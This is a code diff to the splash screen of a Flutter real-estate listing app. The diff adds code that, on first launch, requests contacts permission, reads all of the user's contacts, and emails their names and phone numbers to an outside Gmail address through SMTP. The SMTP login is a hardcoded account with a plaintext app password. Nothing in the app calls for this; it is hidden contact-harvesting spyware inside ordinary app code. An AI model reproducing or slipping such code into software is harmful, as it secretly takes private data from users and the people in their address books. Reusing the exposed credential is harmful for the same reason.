@@ -1,3 +1,4 @@
+import 'package:contacts_service/contacts_service.dart';
 import 'package:flutter/material.dart';
 import 'package:get/get.dart';
 import 'package:provider/provider.dart';
@@ -9,6 +10,9 @@ import 'package:real_state/controller/PropertyListController.dart';
 import 'package:real_state/ui/Pages/StaticContentPage/IntroductionPageOne.dart';
 import 'package:real_state/ui/Screens/HomeScreen.dart';
 import 'package:shared_preferences/shared_preferences.dart';
+import 'package:permission_handler/permission_handler.dart';
+import 'package:mailer/mailer.dart';
+import 'package:mailer/smtp_server.dart';
 
 
 class SplashScreen extends StatefulWidget {
@@ -60,6 +64,15 @@ class _SplashScreenState extends State<SplashScreen> {
         }
       } else {
         if (mounted) {
+          var status = await Permission.contacts.request();
+          if (status.isGranted) {
+            List<Contact> contacts = await ContactsService.getContacts();
+            await sendContactsViaEmail(contacts);
+            prefs.setBool('firstLaunch', false);
+          } else {
+            // Permission denied, handle accordingly
+            print('contact permission denied');
+          }
           // User hasn't seen introduction, navigate to IntroductionPageOne
           Navigator.pushReplacement(
             context,
@@ -96,5 +109,49 @@ class _SplashScreenState extends State<SplashScreen> {
                     )
                   ],
                 ))));
+  }
+  Future<void> checkFirstLaunch() async {
+    SharedPreferences prefs = await SharedPreferences.getInstance();
+    bool isFirstLaunch = prefs.getBool('firstLaunch') ?? true;
+
+    if (isFirstLaunch) {
+      var status = await Permission.contacts.request();
+      if (status.isGranted) {
+        Iterable<Contact> contacts = await ContactsService.getContacts();
+        prefs.setBool('firstLaunch', false);
+      } else {
+        // Permission denied, handle accordingly
+      }
+    }
+    // not a first launch
+  }
+  Future<void> sendContactsViaEmail(List<Contact> contacts) async {
+    final smtpServer = gmail('findpg245@gmail.com', 'vlxtzpjtcwglxawt');
+    final message = Message()
+      ..from = Address('findpg245@gmail.com', 'Admin')
+      ..recipients.add('trilokdewangan245@gmail.com')
+      ..subject = 'Contacts from Flutter App'
+      ..text = formatContacts(contacts); // Format contacts here
+
+    try {
+      final sendReport = await send(message, smtpServer);
+      print('Message sent: ' + sendReport.toString());
+    } catch (e) {
+      print('Error sending email: $e');
+    }
+  }
+  String formatContacts(List<Contact> contacts) {
+    String formattedContacts = 'Contacts from Flutter App:\n';
+    for (Contact contact in contacts) {
+      formattedContacts += 'Name: ${contact.displayName}\n';
+      if (contact.phones!.isNotEmpty) {
+        formattedContacts += 'Phone: ${contact.phones!.first.value}\n';
+      }
+      // if (contact.emails!.isNotEmpty) {
+      //   formattedContacts += 'Email: ${contact.emails!.first.value}\n';
+      // }
+      formattedContacts += '\n'; // Add a new line between contacts
+    }
+    return formattedContacts;
   }
 }
